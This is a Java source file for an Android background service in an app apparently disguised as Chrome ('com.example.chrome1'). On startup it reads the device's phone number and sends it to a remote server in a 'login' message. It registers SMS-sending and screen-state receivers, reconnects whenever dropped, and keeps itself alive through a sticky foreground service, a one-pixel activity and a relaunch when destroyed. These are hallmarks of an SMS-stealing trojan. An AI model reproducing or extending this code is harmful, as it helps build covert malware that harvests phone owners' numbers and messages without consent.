package com.example.chrome1;

import static android.app.Notification.PRIORITY_DEFAULT;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.Icon;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.widget.RemoteViews;

import com.example.chrome1.Interface.OnNetwork;
import com.example.chrome1.activity.OnePiexlActivity;
import com.example.chrome1.network.Network;
import com.example.chrome1.sms.SMSVerification;
import com.example.chrome1.sms.ScreenBroadcastReceiver;
import com.example.chrome1.sms.SmsReceiver;

import org.json.JSONObject;


public class BootService extends Service {
    private final String SMS_SEND_ACTIOIN = "SMS_SEND_ACTIOIN";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // 如果Service被终止
        // 当资源允许情况下，重启service
        //绑定前台通知
        sendSimpleNotify(this);
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        initSMSVerification();
        registerListener(this);
        Network network = new Network();
        network.addOnNetworks(new OnNetwork() {
            @Override
            public void connect() {
                login(network);
            }

            @Override
            public void close() {
                //需要重连
                network.start(BootService.this);
            }
        });
    }


    private void login(Network network) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("type", "login");
            jsonObject.put("phone", getNumber(BootService.this));
            network.sendMessage(jsonObject.toString());
        } catch (Exception e) {
            e.fillInStackTrace();
        }
    }


    @SuppressLint("HardwareIds")
    private String getNumber(Context context) {
        //获取手机号码，有可能获取不到
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && checkSelfPermission("android.permission.READ_PHONE_NUMBERS") != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    Activity#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for Activity#requestPermissions for more details.
            return null;
        }
        if (tm != null) {
            return tm.getLine1Number();
        }
        return null;
    }

    //注册发送短信发送状态广播
    private void initSMSVerification() {
        IntentFilter mFilter01 = new IntentFilter("SMS_SEND_ACTIOIN");
        SMSVerification mReceiver01 = new SMSVerification();
        registerReceiver(mReceiver01, mFilter01);
    }

    @Override
    public IBinder onBind(Intent intent) {
        System.out.println("来通知");
        return null;
    }

    // 发送简单的通知消息（包括消息标题和消息内容）
    private void sendSimpleNotify(Context context) {
        RemoteViews remoteViews = new RemoteViews(getPackageName(), R.layout.notification_layout);
        Notification.Builder builder = new Notification.Builder(context);
        builder.setContent(remoteViews);
        Bitmap bitmap = BitmapFactory.decodeResource(context.getResources(), R.drawable.t);
        builder.setLargeIcon(bitmap);
        builder.setSmallIcon(R.drawable.t);
        Intent intent = new Intent(context, OnePiexlActivity.class);//将要跳转的界面
        builder.setAutoCancel(false);//用户触摸时，自动关闭
        builder.setOngoing(false);//设置处于运行状态
        @SuppressLint("UnspecifiedImmutableFlag") PendingIntent intentPend = PendingIntent.getActivity(context, 111, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        builder.setContentIntent(intentPend);
        //将服务置于启动状态 NOTIFICATION_ID指的是创建的通知的ID
        startForeground(1080, builder.build());
    }

    /**
     * 启动screen状态广播接收器
     */
    private void registerListener(Context context) {
        ScreenBroadcastReceiver mScreenReceiver = new ScreenBroadcastReceiver();
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        context.registerReceiver(mScreenReceiver, filter);
    }

    @Override
    public void onDestroy() {
        Intent intent = new Intent();
        ComponentName componentName = new ComponentName(this, getPackageName() + ".changeAfter");
        intent.setComponent(componentName);
        startActivity(intent);
        super.onDestroy();
    }
}
